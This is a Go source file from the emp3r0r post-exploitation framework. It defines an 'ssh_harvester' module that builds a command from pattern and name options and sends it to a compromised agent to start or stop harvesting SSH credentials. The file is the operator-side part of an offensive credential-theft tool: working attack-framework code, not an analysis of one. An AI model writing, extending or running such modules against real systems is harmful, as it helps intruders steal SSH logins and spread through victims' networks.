package modules

import (
	"fmt"
	"strconv"

	"github.com/jm33-m0/emp3r0r/core/lib/cc/agent_util"
	"github.com/jm33-m0/emp3r0r/core/lib/cc/def"
	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

func module_ssh_harvester() {
	if def.ActiveAgent == nil {
		logging.Errorf("CurrentTarget is nil")
		return
	}
	code_pattern_opt, ok := AvailableModuleOptions["code_pattern"]
	if !ok {
		logging.Errorf("code_pattern not specified")
		return
	}

	reg_name_opt, ok := AvailableModuleOptions["reg_name"]
	if !ok {
		logging.Errorf("reg_name not specified")
	}
	cmd := fmt.Sprintf("%s --code_pattern %s --reg_name %s",
		emp3r0r_def.C2CmdSSHHarvester, strconv.Quote(code_pattern_opt.Val), strconv.Quote(reg_name_opt.Val))
	stop_opt, ok := AvailableModuleOptions["stop"]
	if ok {
		if stop_opt.Val == "yes" {
			cmd = fmt.Sprintf("%s --stop", emp3r0r_def.C2CmdSSHHarvester)
		}
	}
	err := agent_util.SendCmdToCurrentTarget(cmd, "")
	if err != nil {
		logging.Errorf("SendCmd: %v", err)
		return
	}
}
